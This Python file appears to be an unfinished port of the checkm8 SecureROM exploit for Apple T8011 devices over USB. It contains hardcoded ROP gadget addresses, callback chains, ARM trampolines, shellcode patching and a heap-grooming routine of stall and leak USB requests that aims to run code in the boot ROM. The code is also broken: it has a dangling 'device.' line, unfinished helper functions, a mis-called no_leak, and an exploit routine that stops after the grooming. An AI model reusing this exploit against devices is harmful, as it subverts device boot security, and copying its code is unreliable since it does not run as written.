import array, ctypes, struct, sys, time
from socketserver import ThreadingTCPServer
from os import device_encoding
import newDFU
import usb1

# Must be global so garbage collector never frees it
request = None
transfer_ptr = None
never_free_device = None


def libusb1_create_ctrl_transfer(device, request, timeout):
  ptr = device.getTransfer(0)

  transfer = ptr.transfer.contents


def libusb1_async_ctrl_transfer(
  device: usb1.USBDeviceHandle,
  bm_request_type: int,
  b_request: int,
  w_value: int,
  w_index: int,
  data: bytes,
  timeout: float,
) -> None:

  global request, transfer_ptr, never_free_device
  request_timeout = int(timeout) if timeout >= 1 else 0
  start = time.time()
  never_free_device = device
  device.

def from_hex_str(dat: str) -> bytes:
  return bytes(bytearray.fromhex(dat))

def usb_rop_callbacks(address, func_gadget, callbacks):
  data = b''
  for i in range(0, len(callbacks), 5):
    block1 = b''
    block2 = b''
    for j in range(5):
      address += 0x10
      if j == 4:
        address += 0x50
      if i + j < len(callbacks) - 1:
        block1 += struct.pack('<2Q', func_gadget, address)
        block2 += struct.pack('<2Q', callbacks[i+j][1], callbacks[i+j][0])
      elif i + j == len(callbacks) - 1:
        block1 += struct.pack('<2Q', func_gadget, 0)
        block2 += struct.pack('<2Q', callbacks[i+j][1], callbacks[i+j][0])
      else:
        block1 += struct.pack('<2Q', 0, 0)
    data += block1 + block2
  return data

# TODO: assert we are within limits
def asm_arm64_branch(src, dest):
  if src > dest:
    value = 0x18000000 - (src - dest) // 4
  else:
    value = 0x14000000 + (dest - src) // 4
  return struct.pack('<I', value)

# TODO: check if start offset % 4 would break it
# LDR X7, [PC, #OFFSET]; BR X7
def asm_arm64_x7_trampoline(dest):
  return from_hex_str('47000058E0001FD6') + struct.pack('<Q', dest)

# THUMB +0 [0xF000F8DF, ADDR]  LDR.W   PC, [PC]
# THUMB +2 [0xF002F8DF, ADDR]  LDR.W   PC, [PC, #2]
def asm_thumb_trampoline(src, dest):
  assert src % 2 == 1 and dest % 2 == 1
  if src % 4 == 1:
    return struct.pack('<2I', 0xF000F8DF, dest)
  else:
    return struct.pack('<2I', 0xF002F8DF, dest)

def prepare_shellcode(name, constants=[]):
  if name.endswith('_armv7'):
    fmt = '<%sI'
    size = 4
  elif name.endswith('_arm64'):
    fmt = '<%sQ'
    size = 8
  else:
    print('ERROR: Shellcode name "%s" does not end with known architecture. Exiting.' % name)
    sys.exit(1)

  with open('bin/%s.bin' % name, 'rb') as f:
    shellcode = f.read()

  # Shellcode has placeholder values for constants; check they match and replace with constants from config
  placeholders_offset = len(shellcode) - size * len(constants)
  for i in range(len(constants)):
      offset = placeholders_offset + size * i
      (value,) = struct.unpack(fmt % '1', shellcode[offset:offset + size])
      assert value == 0xBAD00001 + i

  return shellcode[:placeholders_offset] + struct.pack(fmt % len(constants), *constants)

class DeviceConfig:
  def __init__(self, version, cpid, large_leak, overwrite, hole, leak):
    assert len(overwrite) <= 0x800
    self.version    = version
    self.cpid       = cpid
    self.large_leak = large_leak
    self.overwrite  = overwrite
    self.hole       = hole
    self.leak       = leak

PAYLOAD_OFFSET_ARMV7 = 384
PAYLOAD_SIZE_ARMV7   = 320
PAYLOAD_OFFSET_ARM64 = 384
PAYLOAD_SIZE_ARM64   = 576

def payload(cpid):
  if cpid == 0x8011:
    constants_usb_t8011 = [
               0x1800B0000, # 1 - LOAD_ADDRESS
        0x6578656365786563, # 2 - EXEC_MAGIC
        0x646F6E65646F6E65, # 3 - DONE_MAGIC
        0x6D656D636D656D63, # 4 - MEMC_MAGIC
        0x6D656D736D656D73, # 5 - MEMS_MAGIC
               0x10000DD64, # 6 - USB_CORE_DO_IO
    ]
    constants_checkm8_t8011 = [
               0x180088948, # 1 - gUSBDescriptors
               0x180083D28, # 2 - gUSBSerialNumber
               0x10000D234, # 3 - usb_create_string_descriptor
               0x18008062A, # 4 - gUSBSRNMStringDescriptor
               0x1800AFC00, # 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
               0x180088A58, # 8 - PAYLOAD_PTR
    ]
    t8011_func_gadget              = 0x10000CCEC
    t8011_dc_civac                 = 0x10000047C
    t8011_write_ttbr0              = 0x1000003F4
    t8011_tlbi                     = 0x100000444
    t8011_dmb                      = 0x100000488
    t8011_handle_interface_request = 0x10000E08C
    t8011_callbacks = [
      (t8011_dc_civac, 0x1800B0600),
      (t8011_dc_civac, 0x1800B0000),
      (t8011_dmb, 0),
      (t8011_write_ttbr0, 0x1800B0000),
      (t8011_tlbi, 0),
      (0x1820B0610, 0),
      (t8011_write_ttbr0, 0x1800A0000),
      (t8011_tlbi, 0),
      (0x1800B0000, 0),
    ]

    t8011_handler   = asm_arm64_x7_trampoline(t8011_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8011)[4:]
    t8011_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8011)
    assert len(t8011_shellcode) <= PAYLOAD_OFFSET_ARM64
    assert len(t8011_handler) <= PAYLOAD_SIZE_ARM64
    t8011_shellcode = t8011_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(t8011_shellcode)) + t8011_handler
    assert len(t8011_shellcode) <= 0x400
    return struct.pack('<1024sQ504x2Q496s32x', t8011_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8011_func_gadget, t8011_callbacks)

def all_exploit_configs():
  t8011_nop_gadget = 0x10000CD0C

  t8011_overwrite    = b'\0' * 0x500 + struct.pack('<32x2Q16x32x2QI',    t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800, 0xbeefbeef)

  return [
    DeviceConfig('iBoot-3135.0.0.2.3',    0x8011, None,    t8011_overwrite,    6,    1), # T8011 (buttons)   NEW: 0.87 seconds
  ]

def exploit_config(serial_number):
  for config in all_exploit_configs():
    if 'SRTG:[%s]' % config.version in serial_number:
      return payload(config.cpid), config
  for config in all_exploit_configs():
    if 'CPID:%s' % config.cpid in serial_number:
      print('ERROR: CPID is compatible, but serial number string does not match.')
      print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
      sys.exit(1)
  print('ERROR: This is not a compatible device. Exiting.')
  sys.exit(1)

def stall(device: usb1.USBDeviceHandle):  print(type(device))
def leak(device: usb1.USBDeviceHandle):    device._controlTransfer(0x80, 6, 0x304, 0x40A, 0xC0, 1)
def no_leak(device: usb1.USBDeviceHandle): device._controlTransfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)

def usb_req_stall(device: usb1.USBDeviceHandle):   device._controlTransfer(0x2, 3,   0x0,  0x80,  0x0, 10)
def usb_req_leak(device: usb1.USBDeviceHandle):    device._controlTransfer(0x80, 6, 0x304, 0x40A, 0x40,  1)
def usb_req_no_leak(device: usb1.USBDeviceHandle): device._controlTransfer(0x80, 6, 0x304, 0x40A, 0x41,  1)

def exploit():
    with usb1.USBContext() as context:
        for deviceA in context.getDeviceIterator(skip_on_error=True):
            if deviceA.getVendorID() == 0x5AC and deviceA.getProductID() == 0x1227:
                start = time.time()
                print(f'Found device: {deviceA.getSerialNumber()}')
                device = deviceA.open()
                if type(device) is not usb1.USBDeviceHandle:
                    print("Error opening USB device. Exiting.")
                    return
                print(type(device))
                if 'PWND:[' in device.getSerialNumber():
                    print("Already pwned. Exiting.")
                    return
                payload, config = exploit_config(device.getSerialNumber())

                if config.large_leak is not None:
                    usb_req_stall(device)
                    for i in range(config.large_leak):
                        usb_req_leak(device)
                    usb_req_no_leak(device)
                else:
                    print('stalling...')
                    stall(device)
                    for i in range(config.hole):
                        print('no_leak...')
                        no_leak(device)
                    print('requesting leak...')
                    usb_req_leak(device)
                    print('no_leak...')
                    no_leak(device)
                device.resetDevice()
                device.releaseInterface()

                print('Heap feng shui finished')
                    



if __name__ == '__main__':
    exploit()